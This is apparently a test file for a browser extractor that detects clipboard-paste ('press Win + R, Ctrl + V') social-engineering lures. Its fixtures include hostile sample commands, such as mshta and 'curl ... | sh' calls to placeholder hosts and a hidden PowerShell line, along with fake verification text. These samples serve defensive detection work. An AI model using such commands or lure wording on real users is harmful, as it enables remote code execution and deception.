import type { Browser } from 'playwright';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { analyze, scanStatus } from '../../src/core/index.js';
import { normalize } from '../../src/core/normalize.js';
import { extract, extractorSource, html, launch, openOffline } from './helpers.js';

let browser: Browser;
beforeAll(async () => { browser = await launch(); });
afterAll(async () => { await browser.close(); });

const U = 'https://fixture.test/';
const texts = (r: Awaited<ReturnType<typeof extract>>) => r.snapshot.blocks.map((b) => b.text);

describe('visibility', () => {
  it('extracts only text a sighted user can see; aria-hidden does not hide', async () => {
    const { page } = await openOffline(browser, { [U]: html(`
      <p>visible paragraph</p>
      <p style="display:none">display-none text</p>
      <p style="visibility:hidden">visibility-hidden text</p>
      <p style="opacity:0">opacity-zero text</p>
      <p style="font-size:0">font-size-zero text</p>
      <p style="position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0,0,0,0)">sr-only text</p>
      <p style="position:absolute;left:-10000px">offscreen text</p>
      <div style="height:0;overflow:hidden"><p>collapsed text</p></div>
      <details><summary>summary text</summary><p>closed-details text</p></details>
      <p aria-hidden="true">aria-hidden but visible text</p>
      <div style="visibility:hidden"><p style="visibility:visible">re-shown child text</p></div>`) });
    const t = texts(await extract(page));
    expect(t).toEqual(['visible paragraph', 'summary text', 'aria-hidden but visible text', 're-shown child text']);
  });

  it('keeps aria-hidden as metadata (D-023) without hiding the text', async () => {
    const { page } = await openOffline(browser, { [U]: html('<div aria-hidden="true"><p>decorative but visible</p></div><p>normal</p>') });
    const { snapshot } = await extract(page);
    expect(snapshot.blocks.map((b) => [b.text, b.ctx?.ariaHidden ?? false])).toEqual([['decorative but visible', true], ['normal', false]]);
  });
});

describe('segmentation and text joining', () => {
  it('joins inline fragments and splits block segments in reading order', async () => {
    const { page } = await openOffline(browser, { [U]: html(`
      <div>Intro <p>para <b>bold</b><span>Ver</span><span>ify</span></p> outro</div>
      <p>line one<br>line two</p><ul><li>first</li><li>second</li></ul>`) });
    expect(texts(await extract(page))).toEqual(['Intro', 'para boldVerify', 'outro', 'line one line two', 'first', 'second']);
  });

  it('includes alt text, button values, placeholders and aria-labels of icon buttons', async () => {
    const { page } = await openOffline(browser, { [U]: html(`<p><img alt="Windows logo" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" width="10" height="10"> key
      <input type="submit" value="Verify"> <input placeholder="Paste here"> <button aria-label="Copy command"></button></p>`) });
    expect(texts(await extract(page))[0]).toBe('Windows logo key Verify Paste here Copy command');
  });
});

describe('containers, context flags and headings', () => {
  it('assigns semantic containers and context flags', async () => {
    const { page } = await openOffline(browser, { [U]: html(`
      <header><p>site header</p></header>
      <main><article><h1>Guide</h1><p>prose</p><pre><code>cmd /c dir</code></pre><blockquote>quoted</blockquote>
        <section class="comments"><div class="comment" id="c1"><p>a comment</p></div></section></article></main>
      <div style="position:fixed;inset:0;z-index:10"><p>overlay text</p></div>
      <dialog open><p>dialog text</p></dialog>`) });
    const { snapshot } = await extract(page);
    const by = (t: string) => snapshot.blocks.find((b) => b.text === t)!;
    expect(by('site header').containerId).toBe('header:body > header:nth-of-type(1)');
    expect(by('prose').containerId).toMatch(/^article:/);
    expect(by('prose').ctx).toMatchObject({ article: true });
    expect(by('prose').headingContext).toBe('Guide');
    expect(by('cmd /c dir').ctx).toMatchObject({ pre: true, article: true });
    expect(by('quoted').ctx).toMatchObject({ quote: true });
    expect(by('a comment').containerId).toBe('ugc:#c1');
    expect(by('a comment').ctx).toMatchObject({ ugc: true });
    expect(by('overlay text').containerId).toMatch(/^overlay:/);
    expect(by('overlay text').ctx).toMatchObject({ overlay: true });
    expect(by('dialog text').ctx).toMatchObject({ dialog: true });
  });

  it('coarse strategy keeps only dialogs/overlays/body as containers', async () => {
    const { page } = await openOffline(browser, { [U]: html('<header><p>h</p></header><article><p>a</p></article>') });
    const { snapshot } = await extract(page, { containerStrategy: 'coarse' });
    expect(new Set(snapshot.blocks.map((b) => b.containerId))).toEqual(new Set(['body']));
  });
});

describe('clipboard payloads, copy triggers and sensitive fields', () => {
  it('collects hidden payload holders and copy triggers, never secrets', async () => {
    const { page } = await openOffline(browser, { [U]: html(`
      <div role="dialog"><p>Click the button</p>
        <button data-clipboard-text="mshta https://x.example.invalid/a">Copy</button>
        <textarea style="position:absolute;left:-9999px">powershell -w hidden -c calc</textarea>
        <pre id="t" style="display:none">curl https://y.example.invalid | sh</pre><button data-clipboard-target="#t">Copy 2</button>
        <form><input type="password" value="hunter2-secret"><input type="hidden" name="csrf" value="tok-123-secret">
        <textarea name="otp_code" style="display:none">998877</textarea><input type="email" value="a@b.example"></form>
      </div>`) });
    const { snapshot } = await extract(page);
    expect(snapshot.hiddenCopyCandidates.map((h) => [h.via, h.text]).sort()).toEqual([
      ['data-attr', 'mshta https://x.example.invalid/a'],
      ['hidden-el', 'curl https://y.example.invalid | sh'],
      ['input', 'powershell -w hidden -c calc'],
    ]);
    expect(snapshot.copyTriggers.map((t) => t.label)).toEqual(['Copy', 'Copy 2']);
    expect(snapshot.copyTriggers[0]!.afterBlockId).toBe(snapshot.blocks[0]!.id);
    const json = JSON.stringify(snapshot);
    for (const secret of ['hunter2-secret', 'tok-123-secret', '998877', 'a@b.example']) expect(json).not.toContain(secret);
  });

  it('never reads values the user typed into visible fields', async () => {
    const { page } = await openOffline(browser, { [U]: html('<textarea id="x"></textarea><input id="y">') });
    await page.fill('#x', 'typed-private-text');
    await page.fill('#y', 'typed-private-input');
    const json = JSON.stringify(await extract(page));
    expect(json).not.toContain('typed-private');
  });
});

describe('shadow DOM and frames', () => {
  const host = (mode: 'open' | 'closed') => html(`<p>light</p><x-w></x-w>`, `<script>
    customElements.define('x-w', class extends HTMLElement { constructor(){ super(); const r = this.attachShadow({mode:'${mode}'});
    r.innerHTML = '<p>shadow text</p>'; } });</script>`);

  it('extracts open shadow roots as a widget container with resolvable locators', async () => {
    const { page } = await openOffline(browser, { [U]: host('open') });
    const { snapshot } = await extract(page);
    const b = snapshot.blocks.find((x) => x.text === 'shadow text')!;
    expect(b.containerId).toMatch(/^widget:/);
    expect(b.locator).toContain('::shadow::');
    const src = await extractorSource();
    expect(await page.evaluate(`(() => { ${src}; const el = VeiltraceExtractor.resolveLocator(document, ${JSON.stringify(b.locator)}); return el && el.textContent; })()`)).toBe('shadow text');
  });

  it('cannot see closed shadow roots without an adapter, and reports them', async () => {
    const { page } = await openOffline(browser, { [U]: host('closed') });
    const { snapshot } = await extract(page);
    expect(texts({ snapshot } as never)).toEqual(['light']);
    expect(snapshot.coverage.closedShadowRootsSkipped).toBe(1);
  });

  it('reads closed shadow roots through the adapter (simulating chrome.dom.openOrClosedShadowRoot)', async () => {
    const { page, context } = await openOffline(browser, { [U]: host('closed') });
    await context.addInitScript(`(() => { const m = new WeakMap(); const orig = Element.prototype.attachShadow;
      Element.prototype.attachShadow = function (i) { const r = orig.call(this, i); m.set(this, r); return r; };
      window.__closedRoots = m; })()`);
    await page.reload();
    const { snapshot } = await extract(page, {}, '(el) => window.__closedRoots.get(el) || el.shadowRoot');
    expect(snapshot.blocks.map((b) => b.text)).toContain('shadow text');
    expect(snapshot.coverage.closedShadowRootsSkipped).toBe(0);
  });

  it('inspects same-origin frames and skips cross-origin frames', async () => {
    const { page, blocked } = await openOffline(browser, {
      [U]: html('<p>top</p><iframe src="https://fixture.test/inner.html" width="300" height="100"></iframe><iframe src="https://other.test/ad.html" width="300" height="100"></iframe>'),
      'https://fixture.test/inner.html': html('<p>same-origin frame text</p>'),
      'https://other.test/ad.html': html('<p>cross-origin frame text</p>'),
    });
    const { snapshot, stats } = await extract(page);
    expect(texts({ snapshot } as never)).toEqual(['top', 'same-origin frame text']);
    expect(snapshot.coverage.framesSkipped).toBe(1);
    expect(stats.framesInspected).toBe(1);
    expect(snapshot.blocks[1]!.containerId).toMatch(/^frame:/);
    expect(blocked).toEqual([]);
  });
});

describe('read-only guarantees and limits', () => {
  it('does not mutate the DOM, click anything or run page handlers', async () => {
    const { page } = await openOffline(browser, { [U]: html(`<div role="dialog"><p>Verify</p>
      <button onclick="window.__clicked = 1" data-clipboard-text="x y z">Copy</button>
      <a href="javascript:window.__nav=1">link</a></div>`) });
    await page.evaluate(`window.__records = []; new MutationObserver((r) => window.__records.push(...r)).observe(document, { subtree: true, childList: true, attributes: true, characterData: true }); window.__before = document.documentElement.outerHTML;`);
    await extract(page);
    await page.waitForTimeout(50);
    expect(await page.evaluate('window.__records.length')).toBe(0);
    expect(await page.evaluate('document.documentElement.outerHTML === window.__before')).toBe(true);
    expect(await page.evaluate('[typeof window.__clicked, typeof window.__nav]')).toEqual(['undefined', 'undefined']);
  });

  it('enforces node and block budgets on very large pages', async () => {
    const rows = Array.from({ length: 30000 }, (_, i) => `<p>row ${i}</p>`).join('');
    const { page } = await openOffline(browser, { [U]: html(rows) });
    const r = await extract(page, { maxNodes: 20000, maxBlocks: 100000 });
    expect(r.snapshot.coverage.truncated).toBe(true);
    expect(r.stats.budgetHit).toBe('nodes');
    expect(r.stats.nodesVisited).toBeLessThanOrEqual(20001);
    const b = await extract(page, { maxBlocks: 100 });
    expect(b.snapshot.blocks).toHaveLength(100);
    expect(b.stats.budgetHit).toBe('blocks');
  });

  it('enforces the time budget', async () => {
    const rows = Array.from({ length: 20000 }, (_, i) => `<p>row ${i}</p>`).join('');
    const { page } = await openOffline(browser, { [U]: html(rows) });
    const r = await extract(page, { timeBudgetMs: 5 });
    expect(r.stats.budgetHit).toBe('time');
    expect(r.snapshot.coverage.truncated).toBe(true);
  });

  it('caps an over-long block without stopping the scan, and reports it', async () => {
    const { page } = await openOffline(browser, { [U]: html(`<p>${'word '.repeat(2000)}</p><p>after the long block</p>`) });
    const r = await extract(page);
    expect(r.snapshot.blocks[0]!.text.length).toBe(2000);
    expect(r.snapshot.blocks[1]!.text).toBe('after the long block');
    expect(r.stats.budgetHit).toBeNull();
    expect(r.snapshot.coverage).toMatchObject({ truncated: true, partial: ['block-text-capped'] });
  });

  it('reports a complete scan with no partial reasons', async () => {
    const { page } = await openOffline(browser, { [U]: html('<p>small page</p>') });
    const r = await extract(page);
    expect(r.snapshot.coverage).toEqual({ framesSkipped: 0, truncated: false, closedShadowRootsSkipped: 0, partial: [] });
    expect(scanStatus({ ...r.snapshot.coverage, coreTruncated: false })).toEqual({ complete: true, reasons: [] });
  });

  it('reports each partial reason: budgets, timeout, skipped frames, closed shadow roots, capped payload lists', async () => {
    const rows = Array.from({ length: 3000 }, (_, i) => `<p>row ${i}</p>`).join('');
    const { page } = await openOffline(browser, {
      [U]: html(`${rows}<iframe src="https://other.test/x" width="100" height="50"></iframe><x-c></x-c>
        ${Array.from({ length: 5 }, (_, i) => `<button data-clipboard-text="payload ${i}">Copy</button>`).join('')}`,
        `<script>customElements.define('x-c', class extends HTMLElement { constructor(){ super(); this.attachShadow({mode:'closed'}).innerHTML = '<p>c</p>'; } });</script>`),
      'https://other.test/x': html('<p>x</p>'),
    });
    expect((await extract(page, { maxBlocks: 100 })).snapshot.coverage.partial).toEqual(['block-budget']);
    expect((await extract(page, { maxNodes: 50 })).snapshot.coverage.partial).toEqual(['node-budget']);
    expect((await extract(page, { maxTotalChars: 200 })).snapshot.coverage.partial).toEqual(['char-budget']);
    expect((await extract(page, { timeBudgetMs: 0 })).snapshot.coverage.partial).toEqual(['timeout']);
    expect((await extract(page, { maxAux: 2 })).snapshot.coverage.partial).toEqual(['aux-capped', 'frames-skipped', 'closed-shadow-skipped']);
    const full = await extract(page);
    expect(full.snapshot.coverage.partial).toEqual(['frames-skipped', 'closed-shadow-skipped']);
    expect(scanStatus({ ...full.snapshot.coverage, coreTruncated: false }).complete).toBe(false);
  });
});

describe('dynamic pages', () => {
  it('sees a modal only after the user interaction reveals it', async () => {
    const { page } = await openOffline(browser, { [U]: html(`<button id="b">Download</button>
      <div id="m" role="dialog" style="display:none"><p>Verify you are human: press Win + R, then Ctrl + V and press Enter.</p></div>
      <script>document.getElementById('b').onclick = () => { document.getElementById('m').style.display = 'block'; };</script>`) });
    expect(analyze((await extract(page)).snapshot).verdict).toBe('none');
    await page.click('#b');
    expect(analyze((await extract(page)).snapshot).verdict).toBe('manipulative_instruction');
  });

  it('notifies (debounced) on DOM changes and history navigation, and stops cleanly', async () => {
    const { page } = await openOffline(browser, { [U]: html('<div id="app"><p>route A</p></div>') });
    const src = await extractorSource();
    await page.evaluate(`(() => { ${src}; window.__events = []; window.__stop = VeiltraceExtractor.watchForChanges(document, (r) => window.__events.push(r), { debounceMs: 50 }); })()`);
    // SPA-style route change: pushState + DOM swap (pushState itself is not observed).
    await page.evaluate(`history.pushState({}, '', '/b'); document.getElementById('app').replaceChildren(Object.assign(document.createElement('p'), { textContent: 'route B' })); document.getElementById('app').append('x');`);
    await page.waitForTimeout(150);
    expect(await page.evaluate('window.__events')).toEqual(['mutation']);
    await page.evaluate(`location.hash = '#next'`);
    await page.waitForTimeout(150);
    expect(await page.evaluate('window.__events')).toEqual(['mutation', 'navigation']);
    await page.evaluate('window.__stop(); document.body.append("after stop")');
    await page.waitForTimeout(150);
    expect(await page.evaluate('window.__events.length')).toBe(2);
    expect(texts(await extract(page))).toContain('route B');
  });
});

describe('end-to-end evidence offsets and localization', () => {
  it('every observation maps to an exact slice of its block, and the block locator resolves to the element showing it', async () => {
    const { page } = await openOffline(browser, { [U]: html(`<main><article><p>Ordinary article text.</p></article></main>
      <div id="gate" style="position:fixed;inset:0;background:#fff"><h2><span>Ver</span>ify you are hu\u200bman</h2>
      <ol><li>Pr\u0435ss W\u0456n + R</li><li>Press <b>Ctrl</b> + <b>V</b></li><li>Press Enter</li></ol>
      <textarea style="position:absolute;left:-9999px">mshta https://z.example.invalid/q</textarea></div>`) });
    const { snapshot } = await extract(page);
    const result = analyze(snapshot);
    expect(result.verdict).toBe('manipulative_instruction');
    const src = await extractorSource();
    for (const o of result.observations) {
      const source = o.source.type === 'block'
        ? snapshot.blocks.find((b) => b.id === (o.source as { blockId: string }).blockId)!
        : o.source.type === 'hiddenCopy' ? snapshot.hiddenCopyCandidates.find((h) => h.id === (o.source as { candidateId: string }).candidateId)! : null;
      if (!source) continue;
      expect(o.text).toBe(source.text.slice(o.start, o.end));
      const inGate = await page.evaluate(`(() => { ${src}; const el = VeiltraceExtractor.resolveLocator(document, ${JSON.stringify(source.locator)}); return !!el && !!el.closest('#gate'); })()`);
      expect(inGate).toBe(true);
      if (o.source.type === 'block') {
        const elText = (await page.evaluate(`(() => { ${src}; return VeiltraceExtractor.resolveLocator(document, ${JSON.stringify(source.locator)}).innerText; })()`)) as string;
        expect(normalize(elText).text).toContain(normalize(o.text).text);
      }
    }
  });
});
